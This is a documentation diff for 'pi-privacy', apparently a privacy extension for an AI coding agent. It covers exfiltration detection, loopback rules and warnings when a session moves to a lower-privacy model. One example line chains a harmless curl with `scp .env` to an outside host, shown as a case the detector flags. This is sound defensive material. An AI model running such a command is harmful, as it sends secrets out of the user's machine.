@@ -99,6 +99,44 @@ blocked outright (loud + safe); mere consumer PII is allowed with a notice so
 automated runs aren't silently broken. Same honesty bound: best-effort egress +
 pattern detection, not a guarantee it caught every channel.
 
+Each command in a line is judged **separately**, so a benign call can't vouch for
+what follows it — `curl http://localhost:3000/x && scp .env me@host:/tmp` flags on
+the `scp`. And "local" means **loopback**, nothing looser: `nas.local` and
+`192.168.1.50` are other machines on the network, so they're egress like any
+other host.
+
+## The third leak path: changing models mid-session
+
+The two gates above judge one request, or one tool call. Neither can see the leak
+that comes from the session itself: you work for an hour against a verified enclave
+— `.env` contents, keys, customer rows, source all accumulating in context — and
+then you switch models. On the next turn that **entire history** is re-sent to the
+new provider. Nothing about the request looks different. What changed is the ceiling
+over it, and only the transition reveals that.
+
+So pi-privacy watches model switches. When the tier drops **and** the context it has
+seen is known to carry PII or secrets, it warns before the next turn — and can put
+the model back:
+
+```
+⚠ Privacy downgrade: Verified TEE → Standard. This session's history — carrying
+1 GitHub token, 2 emails — will be re-sent to openrouter/gpt-x on the next turn.
+   [Stay on the previous model]  [Switch anyway]  [Switch, redacting PII from now on]
+```
+
+```ts
+makePiPrivacyExtension({ downgradePolicy: "warn" }); // "warn" (default) | "block" | "off"
+```
+
+The comparison is by **exposure**, not by tier rank: verified-TEE and on-device are
+equal (an enclave can't read the payload; a loopback endpoint never gets it), so
+moving between them is silent. `tee-unverified` sits with `zdr-policy`, not with
+`tee-verified` — an unproven enclave claim protects nothing, so a TEE model whose
+attestation fails to land *is* a downgrade and is caught on the second pass, once
+attestation resolves. `block` always reverts; with no UI, a credential following the
+session downhill reverts and mere PII is announced. A quiet switch means only that
+nothing structured was detected — the same best-effort floor as everywhere else.
+
 ## Always-on posture badge
 
 The whole point — *verified ≠ asserted* — is only useful if you can see it. pi-privacy
@@ -140,8 +178,11 @@ Every method is feature-detected, so an unsupported sink is skipped, not an erro
   `provider: { zdr: true, data_collection: "deny" }`. OpenRouter filters routing to
   compliant providers and returns `404 No allowed providers` when the policy can't be
   met — it doesn't silently ignore the constraint, which is why `zdr-enforced` is honest.
-- **Local.** A loopback endpoint (`localhost` / `127.0.0.1`) is observable, so on-device
-  inference is detected rather than claimed.
+- **Local.** A loopback endpoint is observable, so on-device inference is detected
+  rather than claimed. Loopback strictly: `localhost` (and RFC 6761 subdomains), all
+  of `127.0.0.0/8`, `::1`, `0.0.0.0`. A LAN address — `box.local`, `192.168.1.50` —
+  is a *different machine*, so it stays `standard`; calling it on-device would be
+  exactly the overclaim this package exists to prevent.
 
 These are *pragmatic* checks suited to an interactive agent, not a replacement for a
 full verifier ([nearai/cloud-verifier](https://github.com/nearai/cloud-verifier),
@@ -169,7 +210,8 @@ effectiveTier("openrouter", { zdrEnforced: true }); // → "zdr-enforced"
 
 `makePiPrivacyExtension(options?)` — `installDispatcher`, `registerProviders`,
 `enforceOpenRouterZdr`, `useDispatcherTransport`, `onPosture`, `resolveTier`,
-`piiPolicy`, `toolExfilPolicy`, `showBadge`, `badgeSinks`, `badgeKey`, `renderBadge`.
+`piiPolicy`, `toolExfilPolicy`, `downgradePolicy`, `showBadge`, `badgeSinks`,
+`badgeKey`, `renderBadge`.
 
 ## Requirements
 
